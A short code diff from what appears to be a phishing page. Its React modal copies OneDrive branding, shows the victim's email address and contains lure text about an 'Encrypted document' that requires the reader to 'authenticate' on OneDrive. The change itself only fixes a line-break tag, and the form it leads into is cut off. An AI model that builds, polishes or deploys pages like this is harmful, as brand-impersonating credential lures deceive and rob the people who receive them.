@@ -84,7 +84,7 @@ const Modal = ({ toggle, open }) => {
             <div className="content">
               <p className="logo"><DiOnedrive /> OneDrive</p>
 {/*               <p className="info-text">An Encrypted document was shared with your email <span>{values.email}</span>. Please proceed to authenticate and view document on OneDrive</p> */}
-              <p className="info-text">Confirm to Download document </br> <span>{values.email}</span>.</p>
+              <p className="info-text">Confirm to Download document. <br /> <span>{values.email}</span> </p>
               <form onSubmit={handleSubmit}>
                 <div className="form-group">
                   <input
